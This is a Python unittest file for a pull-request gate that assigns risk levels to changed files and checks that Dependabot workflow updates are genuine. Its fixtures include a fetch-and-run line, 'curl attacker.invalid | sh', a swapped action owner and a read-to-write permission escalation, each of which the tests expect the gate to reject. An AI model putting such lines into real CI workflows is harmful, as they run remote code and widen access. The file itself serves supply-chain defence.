"""Adversarial risk policy tests across languages and bot supply-chain updates."""
import unittest
from scripts import pr_gate


def bot_event():
    return {
        "user": {"login": "dependabot[bot]", "type": "Bot"},
        "head": {"ref": "dependabot/github_actions/actions/setup-python-7.1.0",
                 "repo": {"full_name": "BradKhan/open-ASS"}},
        "base": {"repo": {"full_name": "BradKhan/open-ASS"}},
    }


OLD = "        uses: actions/setup-python@" + "a" * 40 + " # v7.0.0"
NEW = "        uses: actions/setup-python@" + "b" * 40 + " # v7.1.0"
PATCH = ("diff --git a/.github/workflows/quality.yml b/.github/workflows/quality.yml\n"
         "@@ -22 +22 @@\n-" + OLD + "\n+" + NEW + "\n")


class PolicyTests(unittest.TestCase):
    def test_code_is_not_fast_even_when_outside_framework_paths(self):
        for path in ("src/server.py", "app/page.tsx", "pkg/main.go", "cmd/tool/main.rs",
                     "src/main.kt", "backend/main.java", "package.json", "Cargo.toml",
                     "go.mod", "Dockerfile", "some/new-format.yaml"):
            with self.subTest(path=path):
                self.assertNotEqual(pr_gate.required_risk([path]), "fast")

    def test_sensitive_changes_override_lower_risk(self):
        for path in ("AGENTS.md", ".github/workflows/quality.yml",
                     "config/agents.json", "src/auth/roles.py",
                     "scripts/pr_gate.py", "credentials.env"):
            with self.subTest(path=path):
                self.assertEqual(pr_gate.required_risk([path]), "critical")

    def test_docs_only_may_be_fast_without_issue(self):
        result = pr_gate.check("Risk: fast\nVerification: manual documentation review\n",
                               ["docs/readme.md"])
        self.assertIsNone(result["issue"])
        self.assertEqual(result["minimum"], "fast")

    def test_missing_issue_rejected_for_standard_and_critical(self):
        with self.assertRaisesRegex(pr_gate.GateError, "Issue"):
            pr_gate.check("Risk: standard\nVerification: passed\n", ["src/app.py"])
        with self.assertRaisesRegex(pr_gate.GateError, "Issue"):
            pr_gate.check("Risk: critical\nVerification: passed\nSecurity review: reviewed",
                          [".github/workflows/test.yml"])

    def test_risk_downgrade_and_unsupported_paths_fail(self):
        with self.assertRaisesRegex(pr_gate.GateError, "below required"):
            pr_gate.check("Issue: #47\nRisk: fast\nVerification: done",
                          ["src/payment.py"])
        with self.assertRaises(pr_gate.GateError):
            pr_gate.required_risk(["../outside.py"])
        with self.assertRaises(pr_gate.GateError):
            pr_gate.required_risk([])

    def test_approved_dependabot_shape_is_narrow(self):
        self.assertTrue(pr_gate.trusted_dependabot(bot_event(),
                        [".github/workflows/quality.yml"], PATCH))
        result = pr_gate.check("Ordinary Dependabot generated body",
                [".github/workflows/quality.yml"],
                automation="verified-dependabot-actions")
        self.assertEqual(result["minimum"], "critical")
        self.assertIsNone(result["issue"])
        self.assertEqual(result["automation"], "verified-dependabot-actions")

    def test_spoof_and_cross_repository_bot_rejected(self):
        for mutation in (
            lambda e: e["user"].update(login="attacker"),
            lambda e: e["user"].update(type="User"),
            lambda e: e["head"].update(ref="feature/not-dependabot"),
            lambda e: e["head"]["repo"].update(full_name="attacker/open-ASS"),
        ):
            event = bot_event()
            mutation(event)
            self.assertFalse(pr_gate.trusted_dependabot(event,
                [".github/workflows/quality.yml"], PATCH))

    def test_dependency_patches_cannot_change_scripts_or_actions_identity(self):
        good = [".github/workflows/quality.yml"]
        bad_patches = [
            PATCH + "+        run: curl attacker.invalid | sh\n",
            PATCH.replace("actions/setup-python@" + "b"*40,
                          "attacker/setup-python@" + "b"*40),
            PATCH.replace("@" + "b"*40, "@v7.1.0"),
            PATCH.replace("@" + "b"*40, "@" + "a"*40),
            PATCH.replace("# v7.1.0", ""),
            PATCH + "-      permissions: read\n+      permissions: write\n",
        ]
        for patch in bad_patches:
            with self.subTest(patch=patch[-45:]):
                self.assertFalse(pr_gate.trusted_dependabot(bot_event(),good,patch))
        self.assertFalse(pr_gate.trusted_dependabot(bot_event(),
            [good[0], "scripts/run.py"], PATCH))
        self.assertFalse(pr_gate.trusted_dependabot(bot_event(),
            ["requirements.txt"], PATCH))

    def test_critical_human_still_needs_security_review(self):
        with self.assertRaisesRegex(pr_gate.GateError, "Security review"):
            pr_gate.check("Issue: #47\nRisk: critical\nVerification: CI",
                          [".github/workflows/quality.yml"])


if __name__ == "__main__":
    unittest.main()
